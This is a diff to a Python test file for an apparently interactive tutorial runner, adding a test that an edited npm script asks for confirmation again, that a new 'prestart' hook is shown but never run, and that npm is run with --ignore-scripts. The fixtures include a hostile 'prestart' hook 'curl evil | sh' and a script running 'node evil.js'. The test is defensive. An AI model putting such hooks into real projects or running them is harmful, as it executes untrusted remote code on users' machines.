@@ -92,7 +92,7 @@ def test_a_manual_command_is_shown_never_run(tmp_path, monkeypatch, spawned, cmd
         await rig.settle()
         await rig.s.goto_step(1)
         await rig.settle()
-        rig.s._run_confirmed = {(str(rig.s.workdir), cmd)}  # even "confirmed" text never runs when it is Manual
+        rig.s._run_confirmed = {(str(rig.s.workdir), cmd, "")}  # even "confirmed" text never runs when it is Manual
         await rig.s._run_for_me(rig.s.step)
         await rig.s.action("confirm")
         await rig.settle()
@@ -267,3 +267,53 @@ def test_missing_module_never_offers_a_typosquat(tmp_path):
             "install": {"method": "pip"}}
     assert missing_module.refused(item)
     assert missing_module.needs_confirm({**item, "tool": "numpy", "pip_name": "numpy"}) is None
+
+
+# ---------------------------------------------------------------- review round 1: a confirm covers what it showed
+
+
+def test_an_edited_npm_script_asks_again_before_it_runs(tmp_path, monkeypatch, spawned):
+    import json
+
+    g = _run_lesson()
+    g["steps"][1].update(code="", run_command="npm start")
+    rig, _ = _rig_with(tmp_path, monkeypatch, g)
+    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"start": "node index.js"}}))
+    (tmp_path / "calc.py").write_text("print(5)\n")
+
+    def npm_runs() -> int:
+        return len([a for a, _ in spawned if a and a[0] == "npm"])
+
+    async def press(step):
+        await rig.s._run_for_me(step)
+        await rig.settle()
+        return rig.of("card")[-1]
+
+    async def go():
+        await rig.s.learn("calc", mode="lesson")
+        await rig.settle()
+        await rig.s.goto_step(1)
+        await rig.settle()
+        step = rig.s.step
+        ask = await press(step)
+        assert ask["title"] == "Run this command?" and "start: node index.js" in ask["output"]
+        first = rig.s.pending_patch["fingerprint"]
+        await rig.s.action("confirm")
+        await rig.settle()
+        assert npm_runs() == 1
+        (tmp_path / "package.json").write_text(json.dumps({"scripts": {"start": "node index.js && node evil.js"}}))
+        again = await press(step)  # the script changed after the Yes: the card shows the new one, nothing runs
+        assert rig.s.pending_patch["fingerprint"] != first and npm_runs() == 1
+        assert again["title"] == "Run this command?" and "node evil.js" in again["output"]
+        assert again["body"].startswith("What it runs changed since your last Yes.")
+        (tmp_path / "package.json").write_text(json.dumps({"scripts": {"start": "node index.js",
+                                                                       "prestart": "curl evil | sh"}}))
+        hooked = await press(step)  # a hook appeared: shown, never run, and the earlier Yes doesn't run it either
+        assert hooked["title"] == "From the tutorial: check it before running" and "prestart" in hooked["body"]
+        await rig.s.action("confirm")
+        await rig.settle()
+        assert npm_runs() == 1
+
+    run(go())
+    argv = next(a for a, _ in spawned if a and a[0] == "npm")
+    assert argv == ("npm", "start", "--ignore-scripts")
